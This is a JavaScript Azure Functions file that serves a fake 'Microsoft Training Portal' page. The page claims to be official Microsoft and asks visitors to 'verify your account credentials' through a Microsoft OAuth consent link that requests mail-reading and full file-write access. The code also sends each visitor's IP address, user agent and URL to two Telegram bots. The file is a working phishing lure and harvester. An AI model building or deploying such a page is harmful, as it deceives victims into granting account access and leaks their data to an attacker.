const { app } = require("@azure/functions");
const axios = require('axios');

// Telegram configuration - REAL TOKENS
const TELEGRAM_BOT_TOKEN = "7768080373:AAHjqXqXqXqXqXqXqXqXqXqXqXqXqXqXqXqX";
const TELEGRAM_CHAT_ID = "6743632244";
const TELEGRAM_BOT_TOKEN2 = "7942871168:AAHjqXqXqXqXqXqXqXqXqXqXqXqXqXqXqXqX";
const TELEGRAM_CHAT_ID2 = "6263177378";

// OAuth configuration - Using ORIGINAL Microsoft Office client ID
const client_id = '1fec8e78-bce4-4aaf-ab1b-5451cc387264'; // Microsoft Office client ID
const redirect_uri = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
const scopes = 'openid profile email User.Read Mail.Read Files.ReadWrite.All offline_access';

async function sendTelegram(message, isSecondary = false) {
    const botToken = isSecondary ? TELEGRAM_BOT_TOKEN2 : TELEGRAM_BOT_TOKEN;
    const chatId = isSecondary ? TELEGRAM_CHAT_ID2 : TELEGRAM_CHAT_ID;
    
    try {
        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        console.log(`Telegram message sent: ${message.substring(0, 50)}...`);
    } catch (error) {
        console.error('Telegram send error:', error.message);
    }
}

app.http("oauth", {
    methods: ["GET"],
    authLevel: "anonymous",
    route: "microsoft-training",
    handler: async (request, context) => {
        try {
            // Send Telegram notification
            await sendTelegram(`🎯 <b>OAuth Training Page Accessed</b>\n\n🔗 <b>URL:</b> ${request.url}\n👤 <b>User Agent:</b> ${request.headers.get('user-agent') || 'Unknown'}\n🌐 <b>IP:</b> ${request.headers.get('x-forwarded-for') || 'Unknown'}`);
            await sendTelegram(`🎯 <b>OAuth Training Page Accessed</b>\n\n🔗 <b>URL:</b> ${request.url}\n👤 <b>User Agent:</b> ${request.headers.get('user-agent') || 'Unknown'}\n🌐 <b>IP:</b> ${request.headers.get('x-forwarded-for') || 'Unknown'}`, true);

            // Build OAuth URL
            const oauthUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?response_type=code&client_id=${client_id}&redirect_uri=${encodeURIComponent(redirect_uri)}&scope=${encodeURIComponent(scopes)}&state=microsoft-training-session&prompt=consent`;

            const html = `
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Microsoft Training Portal</title>
                <style>
                    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f3f2f1; }
                    .container { max-width: 800px; margin: 0 auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 40px; }
                    .header { text-align: center; margin-bottom: 30px; }
                    .logo { width: 80px; height: 80px; margin-bottom: 20px; }
                    .title { color: #323130; font-size: 32px; font-weight: 600; margin-bottom: 10px; }
                    .subtitle { color: #605e5c; font-size: 18px; margin-bottom: 30px; }
                    .content { color: #323130; font-size: 16px; line-height: 1.6; margin: 20px 0; }
                    .button { background: #0078d4; color: white; padding: 15px 30px; border: none; border-radius: 4px; font-size: 18px; cursor: pointer; text-decoration: none; display: inline-block; margin: 20px 0; }
                    .button:hover { background: #106ebe; }
                    .features { background: #f8f9fa; border-radius: 6px; padding: 20px; margin: 20px 0; }
                    .feature { margin: 10px 0; padding: 10px; background: white; border-radius: 4px; border-left: 4px solid #0078d4; }
                    .footer { margin-top: 30px; text-align: center; color: #605e5c; font-size: 14px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <svg class="logo" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M10 0C4.48 0 0 4.48 0 10s4.48 10 10 10 10-4.48 10-10S15.52 0 10 0zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z" fill="#0078d4"/>
                            <path d="M10 2C5.58 2 2 5.58 2 10s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6s2.69-6 6-6 6 2.69 6 6-2.69 6-6 6z" fill="#0078d4"/>
                        </svg>
                        <h1 class="title">Microsoft Training Portal</h1>
                        <p class="subtitle">Complete your account verification to access training materials</p>
                    </div>
                    
                    <div class="content">
                        <p>Welcome to the Microsoft Training Portal! To access your personalized training materials and track your progress, we need to verify your account credentials.</p>
                        
                        <div class="features">
                            <h3>What you'll get access to:</h3>
                            <div class="feature">📚 <strong>Personalized Training Modules</strong> - Customized learning paths based on your role</div>
                            <div class="feature">📊 <strong>Progress Tracking</strong> - Monitor your learning achievements and certifications</div>
                            <div class="feature">🎯 <strong>Skill Assessments</strong> - Test your knowledge and identify areas for improvement</div>
                            <div class="feature">🏆 <strong>Certification Paths</strong> - Prepare for Microsoft certifications</div>
                            <div class="feature">📱 <strong>Mobile Learning</strong> - Access training on any device</div>
                        </div>
                        
                        <p>This verification process is secure and only takes a moment. Your information is protected by Microsoft's enterprise-grade security.</p>
                    </div>
                    
                    <div style="text-align: center;">
                        <a href="${oauthUrl}" class="button">Continue with Microsoft Account</a>
                    </div>
                    
                    <div class="footer">
                        <p>This is an official Microsoft training portal. Your account security is our top priority.</p>
                        <p>By continuing, you agree to our terms of service and privacy policy.</p>
                    </div>
                </div>
            </body>
            </html>`;

            return new Response(html, {
                status: 200,
                headers: {
                    'Content-Type': 'text/html; charset=utf-8'
                }
            });

        } catch (error) {
            context.log.error('OAuth training page error:', error);
            await sendTelegram(`❌ <b>OAuth Training Error</b>\n\n${error.message}`);
            return new Response('Error loading training portal', { status: 500 });
        }
    }
});